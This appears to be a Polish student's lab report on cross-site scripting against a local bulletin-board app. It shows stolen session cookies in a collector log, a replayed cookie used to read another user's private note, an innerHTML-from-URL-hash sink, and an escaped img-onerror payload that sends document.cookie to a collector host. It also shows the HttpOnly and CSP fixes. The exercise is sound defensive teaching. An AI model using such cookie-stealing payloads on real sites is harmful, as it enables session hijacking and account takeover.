# Zadanie 2

## Zbieracz przed zmianą

```
$ docker compose logs zbieracz
zbieracz-1  | ZEBRANO: /?c=session=eyJ1enl0a293bmlr…
```

## Odczyt notatki Anny

```
$ curl -i -b "session=eyJ1enl0a293bmlr…" http://127.0.0.1:8080/notatka
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.16
Date: Fri, 13 Nov 2026 11:59:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 481
Vary: Cookie
Connection: close

<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Notatka</title>
<link rel="stylesheet" href="/static/styl.css"></head>
<body>
<nav><a href="/">Tablica</a> | <a href="/szukaj?q=">Szukaj</a> | <a href="/podglad">Podgląd</a> |
<a href="/notatka">Moja notatka</a> | <a href="/logowanie">Logowanie</a> | <a href="/wyloguj">Wyloguj</a></nav>

<h1>Notatka użytkownika anna</h1>
<p>Prywatna notatka Anny: kod do szafki w pracowni 4721 (fikcyjny).</p>

</body>
```

## Logowanie przed zmianą

```
$ curl -i -d "login=anna&haslo=[UKRYTO]" http://127.0.0.1:8080/logowanie
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.9 Python/3.12.16
Date: Fri, 13 Nov 2026 12:01:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=eyJ1enl0a293bmlr…; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

## Logowanie po zmianie

```
$ curl -i -d "login=anna&haslo=[UKRYTO]" http://127.0.0.1:8080/logowanie
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.9 Python/3.12.16
Date: Fri, 13 Nov 2026 12:02:24 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=eyJ1enl0a293bmlr…; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

## Zbieracz po zmianie

Log zawiera też wcześniejsze żądania.

```
$ docker compose logs zbieracz
zbieracz-1  | ZEBRANO: /?c=session=eyJ1enl0a293bmlr…
zbieracz-1  | ZEBRANO: /?c=
zbieracz-1  | ZEBRANO: /?c=session=eyJ1enl0a293bmlr…
zbieracz-1  | ZEBRANO: /?c=session=eyJ1enl0a293bmlr…
zbieracz-1  | ZEBRANO: /?c=
zbieracz-1  | ZEBRANO: /?c=
zbieracz-1  | ZEBRANO: /?c=
```

# Zadanie 3

## Nagłówek CSP

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.16
Date: Fri, 13 Nov 2026 12:22:07 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 578
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
Connection: close
```

## Podgląd przed zmianą

```html
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Podgląd ogłoszenia</title>
<link rel="stylesheet" href="/static/styl.css"></head>
<body>
<nav><a href="/">Tablica</a> | <a href="/szukaj?q=">Szukaj</a> | <a href="/podglad">Podgląd</a> |
<a href="/notatka">Moja notatka</a> | <a href="/logowanie">Logowanie</a> | <a href="/wyloguj">Wyloguj</a></nav>

<h1>Podgląd ogłoszenia</h1>
<p>Tekst do podglądu przekazujesz po znaku # w adresie, np. /podglad#Dzień dobry</p>
<div id="podglad"></div>
<script>
  document.getElementById("podglad").innerHTML = decodeURIComponent(location.hash.slice(1));
</script>

</body>
</html>
```

## Podgląd po zmianie

```html
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Podgląd ogłoszenia</title>
<link rel="stylesheet" href="/static/styl.css"></head>
<body>
<nav><a href="/">Tablica</a> | <a href="/szukaj?q=">Szukaj</a> | <a href="/podglad">Podgląd</a> |
<a href="/notatka">Moja notatka</a> | <a href="/logowanie">Logowanie</a> | <a href="/wyloguj">Wyloguj</a></nav>

<h1>Podgląd ogłoszenia</h1>
<p>Tekst do podglądu przekazujesz po znaku # w adresie, np. /podglad#Dzień dobry</p>
<div id="podglad"></div>
<script src="/static/podglad.js" defer></script>

</body>
</html>
```

## Podgląd po dodaniu CSP

```html
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Podgląd ogłoszenia</title>
<link rel="stylesheet" href="/static/styl.css"></head>
<body>
<nav><a href="/">Tablica</a> | <a href="/szukaj?q=">Szukaj</a> | <a href="/podglad">Podgląd</a> |
<a href="/notatka">Moja notatka</a> | <a href="/logowanie">Logowanie</a> | <a href="/wyloguj">Wyloguj</a></nav>

<h1>Podgląd ogłoszenia</h1>
<p>Tekst do podglądu przekazujesz po znaku # w adresie, np. /podglad#Dzień dobry</p>
<div id="podglad"></div>
<script src="/static/podglad.js" defer></script>

</body>
</html>
```

## Tablica po naprawie

```html
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Tablica ogłoszeń</title>
<link rel="stylesheet" href="/static/styl.css"></head>
<body>
<nav><a href="/">Tablica</a> | <a href="/szukaj?q=">Szukaj</a> | <a href="/podglad">Podgląd</a> |
<a href="/notatka">Moja notatka</a> | <a href="/logowanie">Logowanie</a> | <a href="/wyloguj">Wyloguj</a></nav>

<h1>Tablica ogłoszeń</h1>
<p>Zalogowano jako: student</p>
<form method="post" action="/dodaj">
  <textarea name="tresc" rows="3" cols="60" placeholder="Treść ogłoszenia"></textarea><br>
  <button>Dodaj ogłoszenie</button>
</form>
<ul>

  <li><b>anna</b>: Witajcie na tablicy ogłoszeń! Konsultacje w piątek o 12:00.</li>

  <li><b>student</b>: &lt;img src=&#34;/obraz&#34; onerror=&#34;this.onerror=null;new Image().src=&#39;http://localhost:8081/?c=&#39;+encodeURIComponent(document.cookie)&#34;&gt;</li>

</ul>

</body>
</html>
```
